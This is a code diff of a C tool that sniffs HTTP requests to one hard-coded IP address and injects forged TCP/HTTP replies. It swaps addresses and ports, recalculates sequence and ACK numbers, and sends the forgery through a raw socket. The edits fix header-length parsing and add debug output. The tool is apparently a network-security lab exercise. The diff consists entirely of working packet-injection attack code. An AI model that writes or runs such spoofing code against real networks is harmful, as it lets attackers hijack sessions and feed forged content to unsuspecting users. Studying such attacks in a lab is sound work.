@@ -35,9 +35,9 @@ void spoof_reply_http(ipheader *ip) {
 	setsockopt(sock , IPPROTO_IP , IP_HDRINCL , &enable, sizeof(enable));
 	
 	/* Read template of IP packet*/
-	FILE *f = fopen( "ip.bin", "rb");
+	FILE *f = fopen( "http.bin", "rb");
 	if (!f) {
-		perror( " Can't open 'ip.bin'");
+		perror( " Can't open 'http.bin'");
 		exit (0);
 	}
 
@@ -46,10 +46,12 @@ void spoof_reply_http(ipheader *ip) {
 
 	/* Swap src and dst info */
 	unsigned short srcPort = tcpReceive->th_dport;			// Swap src and dst port
+	printf("Reveive dest port %d \n",ntohs(tcpReceive->th_dport));
 	unsigned int srcIp = (ip->iph_dstip).s_addr;	// Swap src and dst ip
 	
 	unsigned short dstPort = tcpReceive->th_sport;
 	unsigned int dstIp = (ip->iph_srcip).s_addr;
+	printf("Reveive source port %d \n",ntohs(tcpReceive->th_sport));
 
 	memcpy(ipData+12, &srcIp, 4);	// Change src ip
 	memcpy(ipData+16, &dstIp, 4);	// Change dst ip
@@ -57,19 +59,37 @@ void spoof_reply_http(ipheader *ip) {
 	memcpy(ipData+20, &srcPort, 2);	// Change src port
 	memcpy(ipData+22, &dstPort, 2);	// Change dst port
 
+
 	/* Re-calculate sequence number and ack number */
 	ipheader *ipSend = (ipheader *)ipData;
 	int IP_HEADER_SEND_LEN = ipSend -> iph_ihl * 4;
 	tcpheader *tcpSend = (tcpheader *) ((u_char *)ipData + IP_HEADER_SEND_LEN);
-	
+
+	//char *dataSend = (char *)  ((u_char *)ipData + 40);
+	/*printf("data send %s\n",dataSend);*/
+
+	//printf("seq %d\n",tcpReceive -> th_seq);
+	printf("seq %" PRIu32 "\n",ntohl(tcpReceive -> th_seq));
+    
+	//printf("ack %d\n",tcpReceive -> th_ack);
+	printf("ack %" PRIu32 "\n",ntohl(tcpReceive -> th_ack));
+
 	/* New sequence number = received ack number*/
 	tcpSend ->  th_seq = tcpReceive -> th_ack;
 
 	/* New ACK number= received sequence number + TCP payload length */
-	char *payloadReceive = (char *) ((u_char *)ip + IP_HEADER_LEN + TCP_HEADER_LEN);
-	uint32_t payloadLen = strlen(payloadReceive);
+	uint8_t TCP_HEADER_LEN2 =  tcpReceive->th_offx2 >> 4;
+	TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
+	u_char *payloadReceive = (u_char *) ((u_char *)tcpReceive + TCP_HEADER_LEN2);
+	
+	uint32_t payloadLen = strlen((char *) payloadReceive);
+	printf("%02x \n",payloadReceive[0]);
+	printf("%02x \n",payloadReceive[payloadLen -1]);
 	tcpSend -> th_ack = htonl(ntohl(tcpReceive -> th_seq) + payloadLen); 
 
+	printf("payload length %" PRIu32 "\n", payloadLen);
+	printf("respond seq %" PRIu32 "\n", ntohl(tcpSend -> th_seq));
+	printf("respond ack %" PRIu32 "\n", ntohl(tcpSend -> th_ack));
 
 	/* Dst info to send by raw socket*/
 	struct sockaddr_in dstInfo;
@@ -95,16 +115,17 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
 			case IPPROTO_TCP:	;// TCP protocol
 				tcpheader *tcp = (tcpheader *) ((u_char *)packet + ETHERNET_HEADER_LEN + IP_HEADER_LEN);
-				int TCP_HEADER_LEN2 =  tcp->th_offx2 / 8;
-				//printf("headerlen: %d", TCP_HEADER_LEN2);
-				u_char * data = (u_char *) ((u_char *)ip + ETHERNET_HEADER_LEN + IP_HEADER_LEN + TCP_HEADER_LEN2 + 2);
+				uint8_t TCP_HEADER_LEN2 =  tcp->th_offx2 >> 4;
+				TCP_HEADER_LEN2 = TCP_HEADER_LEN2 * 4;
+				u_char * data = (u_char *) ((u_char *)tcp + TCP_HEADER_LEN2);
 				char match = 0;
 				if (ntohs(tcp->th_dport)==80 && data != NULL && strlen((char *) data) > 10) {
 					httprequest *request = parseRequest(data);
+					//printf("data %s \n", data);
 					if (request != NULL) {
 						//char *token = NULL;
 						//token = strtok(request->host, ":");
-						printf("host %s\n", request->host);
+						//printf("data2 %s \n", data);
 						if (!strncmp(request->host,"112.137.129.87",strlen(request->host))) match =1;
 						if (match) {
 							spoof_reply_http(ip);
